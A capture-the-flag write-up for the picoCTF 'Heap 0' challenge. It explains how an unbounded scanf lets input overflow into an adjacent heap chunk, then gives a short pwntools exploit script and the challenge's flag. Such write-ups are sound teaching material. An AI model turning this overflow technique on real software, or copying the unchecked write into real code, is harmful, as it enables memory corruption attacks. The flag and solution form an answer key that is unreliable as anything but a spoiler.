# Heap 0

**Link**: https://play.picoctf.org/practice/challenge/438

**Difficulty**: easy

## Description

Are overflows just a stack concern?

## Resources

- **chall**: the vulnerable binary
- **chall.c**: its source code
- **solver.py**: pwntools exploit
- **flag.txt**: local debugging flag

## Key observations (from the source)

- Two heap blocks are allocated one after another:

      input_data = malloc(INPUT_DATA_SIZE);   // "pico"  (your buffer)
      safe_var   = malloc(SAFE_VAR_SIZE);     // "bico"  (the target)

- The win condition only checks that `safe_var` is no longer `"bico"`:

      if (strcmp(safe_var, "bico") != 0) { /* print flag */ }

- Option **2 ("Write to buffer")** does `scanf("%s", input_data)` with **no length
  check** — an unbounded write into a small heap chunk. Since `safe_var` sits
  right after `input_data` on the heap, we can overflow forward into it.

The menu:

    1. Print Heap        (leaks addresses of both chunks)
    2. Write to buffer   (unbounded scanf -> heap overflow)
    3. Print safe_var
    4. Print Flag        (checks safe_var != "bico")
    5. Exit

## How to solve

1. Parse the two leaked addresses from the "Print Heap" output.
2. The distance to overwrite is `safe_var - input_data`. Write that many `A`s to
   fill up to `safe_var`, then one more byte so `safe_var` differs from `"bico"`.
3. Choose option 4 to print the flag.

Exploit (see `solver.py`, run with `python3 solver.py REMOTE`):

    informations = io.recvuntil(b'Enter your choice: ')
    address1 = int(informations[341:355], 16)   # input_data
    address2 = int(informations[406:420], 16)   # safe_var
    diff = address2 - address1
    io.sendline(b'2')
    io.recvuntil(b'Data for buffer: ')
    io.sendline(b'A' * diff + b'b')              # fill gap + clobber safe_var
    io.recvuntil(b'Enter your choice: ')
    io.sendline(b'4')
    print(io.recvall(1))

> Note: the byte offsets `[341:355]` / `[406:420]` are slices into the exact banner
> text — if the menu wording changes, re-derive them (or parse with a regex on
> `0x[0-9a-f]+`).

## Flag

    picoCTF{my_first_heap_overflow_4fa6dd49}
